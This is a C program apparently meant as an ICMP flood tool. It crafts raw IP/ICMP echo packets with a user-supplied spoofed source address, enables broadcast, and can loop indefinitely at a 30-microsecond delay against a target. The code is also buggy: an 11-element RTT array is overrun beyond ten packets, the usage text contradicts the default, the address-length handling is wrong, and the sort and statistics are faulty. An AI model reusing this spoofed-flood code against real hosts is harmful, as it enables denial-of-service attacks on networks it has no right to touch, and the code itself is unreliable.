#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/time.h>

#define BUFFER_SIZE 84
#define PACKET_DELAY_USEC 30
#define DEF_NUM_PACKETS 100

double rttArray[11];
double avg,sum;
int lost = 0;
char buf[BUFFER_SIZE];

char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
			   <saddr> = spoofed source address\n \
			   <daddr> = target IP address\n \
			   <# packets> = is the number of packets to send, 100 is the default, 0 = infinite\n";

void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
{
	// IP Layer
	ip->ip_v = 4;
	ip->ip_hl = sizeof*ip >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(sizeof(buf));
	ip->ip_id = htons(4321);
	ip->ip_off = htons(0);
	ip->ip_ttl = 52;
	ip->ip_p = 1;
	ip->ip_sum = 0; /* Let kernel fill in */

	// ICMP Layer
	icmp->type = ICMP_ECHO;
//	printf("icmp->type=%d\n",icmp->type);
	icmp->code = 0;	
	icmp->checksum = htons(~(ICMP_ECHO << 8));	
}

void set_socket_options(int s)
{
	int on = 1;

	// Enable broadcast
	if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
		perror("setsockopt() for BROADCAST error");
		exit(1);
	}

	// socket options, tell the kernel we provide the IP structure 
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
		perror("setsockopt() for IP_HDRINCL error");
		exit(1);
	}	
}

int main(int argc, char *argv[])
{
	int s, i;	
	struct ip *ip = (struct ip *)buf;
	struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
	struct hostent *hp, *hp2;
	struct sockaddr_in dst;
	struct sockaddr_in src;
	int offset;
	int num = DEF_NUM_PACKETS;

	if(argc < 3){
		fprintf(stdout, "%s\n",usage);
		exit(1);
	}

	// If enough arguments supplied 
	if(argc == 3) {
		num = 10;
	}

	// Loop based on the packet number
	for(i = 1; num == 0 ? num == 0 : i <= num; i++){
		// Clear data paylod
		memset(buf, 0, sizeof(buf));

		// Create RAW socket 
		if((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0){
			perror("socket() error");
			exit(1);
		}

		set_socket_options(s);

		if((hp = gethostbyname(argv[2])) == NULL){
			if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1){
				fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
				exit(1);
			}
		}else
			memcpy(&ip->ip_dst.s_addr, hp->h_addr_list[0], hp->h_length);

		if((hp2 = gethostbyname(argv[1])) == NULL){
			if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1){
				fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
				exit(1);
			}
		}else
			memcpy(&ip->ip_src.s_addr, hp2->h_addr_list[0], hp->h_length);

		set_ip_layer_fields(icmp, ip);

		dst.sin_addr = ip->ip_dst;
		dst.sin_family = AF_INET;

		// send time
		struct timeval start, end;
		gettimeofday(&start, NULL);

		int errSend = 0;
		errSend = sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst));

		// recvfrom
		char buf2[84];
		//struct ip *ip = (struct ip *)buf2;
		int fromlen = 98;
		fromlen = sizeof(src);
		
		struct timeval timeout = {3,0};   /* 3 seconds, 0 microseconds */
		
		setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const void*) &timeout, sizeof(timeout));

		int errRecv = 0;
		errRecv = recvfrom(s, buf2, sizeof(ip)+sizeof(icmp)+sizeof(buf2), 0, 
						//NULL, (int *)&fromlen)) < 0) {
						(struct sockaddr *)&src, &fromlen);
		gettimeofday(&end, NULL);
		
		if (errSend>0 && errRecv>0) {
			printf("64 bytes from %s: icmp_req=%d ttl=52 ", inet_ntoa(src.sin_addr), i);
		
			double t1,t2;
			t1=0.0;
			t2=0.0;
			t1+=start.tv_sec+(start.tv_usec/1000000.0);
			t2+=end.tv_sec+(end.tv_usec/1000000.0);
			rttArray[i] = (t2-t1)*1000;
			printf("rtt=%4.1fms\n", rttArray[i]);

		}
		else {
			printf("packet lost : icmp_req=%di\n", i);
			lost++;
		}

		sum += rttArray[i];

		close(s);
		usleep(PACKET_DELAY_USEC);
	}
	
	// Print statistics
	avg = 0;
	avg = sum/10;
	double temp;
	int j,tag=1;
	for (i=1; i<=num; i++) {
		if(tag==0) {
			break;
		}
		tag=0;
		for(j=num-1; j>i; j--) {
			if(rttArray[j] < rttArray[i]) {
				temp = rttArray[j-1];
				rttArray[j-1] = rttArray[j];
				rttArray[j] = temp;
				tag=1;
			}
		}
	}
	printf("\n--- %s ping statistics ---\n", inet_ntoa(src.sin_addr));
	printf("%d packets transmitted, %d received, %i%% packet loss\n",
			num, num-lost, (lost*100)/num);
	printf("rtt min/avg/max/mdev = %4.3f/%4.3f/%4.3f/%4.3f ms\n",
			rttArray[1], avg, rttArray[10], rttArray[5]);

	return 0;
}
